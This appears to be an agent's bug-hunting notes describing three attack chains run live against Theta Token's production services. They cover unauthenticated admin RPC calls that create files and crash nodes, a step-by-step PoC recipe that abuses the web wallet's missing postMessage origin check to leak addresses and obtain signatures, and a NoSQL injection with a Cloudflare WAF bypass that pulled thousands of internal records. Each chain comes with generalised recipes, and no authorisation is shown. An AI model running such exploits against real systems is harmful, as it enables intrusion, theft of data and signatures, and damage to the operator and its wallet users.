# Theta Token 2026-08 — Web2+Web3 hybrid hunt (3 live-proven chains)

Hunt against thetatoken org (theta-protocol-ledger Go node, theta-wallet-web React, theta-infrastructure-ledger-explorer Express/Mongo). Three chains all **proven live against production**. Session evidence dir: /root/theta-hunt/ (findings-theory2.md, poc-live.html, poc-result.png, poc-theory2.html).

## Chain A — Admin RPC methods exposed pre-auth (`theta.BackupChain`)

- `ledger/rpc/server.go` registers ALL exported methods of ThetaRPCService via `RegisterName("theta", ...)` with **no auth middleware**, only CORS `*`. Admin ops intended for local `thetacli` are callable by anyone who reaches the RPC port.
- `ledger/rpc/backup.go:72-75`: `backupDir := path.Join(args.Config, "backup", "chain")` — `config` is a raw user string, zero validation, then `os.MkdirAll(backupDir, os.ModePerm)` (0777!) and `os.Create(...)` in `snapshot/chain_export.go:42`.
- **Live PoC**: `POST https://theta-bridge-rpc.thetatoken.org/rpc {"jsonrpc":"2.0","method":"theta.BackupChain","params":[{"config":"/tmp/a/b/c/operator_deep","start":N,"end":N}],"id":1}` → `{"result":{"actual_start_height":...,"chain_file":"theta_chain-..."}}` — arbitrary dir+file creation confirmed on production. `theta.BackupSnapshot` → 502 (DoS primitive, repeated → node crash).
- Cap: filename is server-generated (`theta_chain-<start>-<height>-<date>`), so direct cron/ssh overwrite needs a second link (a consumer of dropped files, or snapshot-restore path). Pattern to hunt in any Go chain RPC: methods named Backup*/Export*/Debug* reachable on the public RPC mux.

## Chain B — Origin-less postMessage bridge in web wallet (END-TO-END, ecrecover-verified)

- `wallet/src/services/Web3Bridge.js:42` — `window.addEventListener('message', …)` with the origin check **commented out (TODO)**; `respond()` posts back with `targetOrigin='*'`. Methods reachable from any origin with a window handle: `eth_requestAccounts` (address leak), `personal_sign`, `eth_sendTransaction`, `wallet_switchEthereumChain`, `wallet_sendDomainMetadata` (spoofs trusted dapp name/icon in the confirm modal).
- `modals/PersonalSignModal.js:69-74` — sign executes with in-memory key, **password never consumed** (dead state). `ConfirmTransactionModal.js:52,267` — embed mode auto-fills password from `TemporaryState` and HIDES the field.
- `Pages.js` route `/embed?k=<b64-keystore>&p=<b64-password>` auto-unlocks (Theta embed design distributes such links); `index.js:11` + `state/actions/Wallet.js:85-94` — `?after-unlock=show-dapp-<url>` iframes an arbitrary attacker URL inside the wallet after any unlock.
- **Verify origin check absence in production bundle** (don't trust source maps): download the live `main.*.js`, find `addEventListener("message"` occurrences, then check a ~4KB window after the Web3Bridge handler (the async one touching `store.getState()/selectedAddress`) for any `.origin` mention — zero mentions = no check. Confirm the method strings (`personal_sign`, `eth_sendTransaction`) dispatch nearby.
- **Live end-to-end PoC recipe (headless, proves the full chain with zero funds):**
  1. Generate a fresh EMPTY mainnet keystore (`eth_account` + `eth_keyfile`; set `address` field lowercase no-0x for Theta format), base64-encode keystore JSON and password.
  2. Attacker HTML at fake origin (puppeteer `setRequestInterception` mapping `http://evil.local/` to the PoC page) iframes `https://wallet.thetatoken.org/embed?k=<b64>&p=<b64>`.
  3. After ~6s: `frame.contentWindow.postMessage(JSON.stringify({type:'request',request:{id:1,method:'eth_requestAccounts',params:[]}}),'*')` → wallet replies `{"id":1,"result":["0x..."]}` to the attacker origin. **This response alone proves the missing origin check.**
  4. Send `personal_sign`; the modal renders with NO password field, only Reject/Confirm. Theta confirm buttons are `<a class="GradientButton">` NOT `<button>` — `querySelectorAll('button')` finds nothing; match by exact innerText `Confirm` across `div,button,a,span` and `.click()` it.
  5. Wallet returns `{"id":2,"result":"0x<65-byte sig>"}` to attacker origin. Verify with `Account.recover_message(encode_defunct(text=msg), signature=sig)` == wallet address → cryptographic proof, no transaction broadcast needed.
- Same PoC pattern applies to any web3 wallet claiming dapp-bridge postMessage security: the address-leak probe (`eth_requestAccounts`) is the zero-impact proof; personal_sign adds cryptographic proof; never need `eth_sendTransaction` against funded wallets.

## Chain C — NoSQL injection: Cloudflare WAF bypass via `$exists`

- `explorer-api/routes/accountingRouter.js:9` `let wallet = req.query.wallet` → `mongo-db/accounting-dao.js:23` `queryObj = { addr: wallet, date: {...} }` — straight into Mongo, no cast/validation.
- Cloudflare WAF (in front of explorer.thetatoken.org:8443) blocks `[$ne]`, `[$gt]`, `[$regex]` in query strings with a 403 (identical 5486-byte block page, ~0.05s = WAF, not app). **`$exists` and non-`$` bracket keys are NOT blocked.**
- Differential probe pattern: `wallet[abc]=x` → `[]` (param reaches app, no match) vs `wallet[$exists]=true` → `HTTP 200 + data` = injection confirmed.
- **Live result**: `GET /api/accounting?wallet[$exists]=true&start=2020-01-01&end=2026-12-31` → 810KB, 7,209 records, 3 operational TFuel accounting wallets of the Theta team (internal data, pre-auth).
- Generalizable WAF-bypass oracle for Express+qs+Mongo behind Cloudflare: try the full operator set (`$exists`, `$size`, `$type`, `$elemMatch`, `$mod`, `$all`, `$in` as `key[$in][]=`) — WAF signature lists are usually partial; always pair with a benign-bracket control request to prove the param reaches the app.

## Environment fix — headless Chrome on TencentOS 4

- Repo TencentOS-Core lacks `alsa-lib`/`mesa-libgbm`. Chrome-for-testing fails `libasound.so.2 not found`.
- Fix: download RPMs from Rocky 9 AppStream and force-install: list actual filenames first via `curl -s https://dl.rockylinux.org/pub/rocky/9/AppStream/x86_64/os/Packages/<letter>/ | grep -oE '<pkg>-[^"]*x86_64\.rpm'` (version numbers rotate — guessed URLs 404 at 153 bytes), then `rpm -i --nodeps alsa-lib-*.rpm mesa-libgbm-*.rpm`. Verify with `ldd <chrome> | grep -c "not found"` == 0.
- Use `puppeteer-core` (no bundled chromium download) with `executablePath` to the preinstalled browser at `/root/.agent-browser/browsers/chrome-*/chrome`, args `--no-sandbox --disable-dev-shm-usage`.
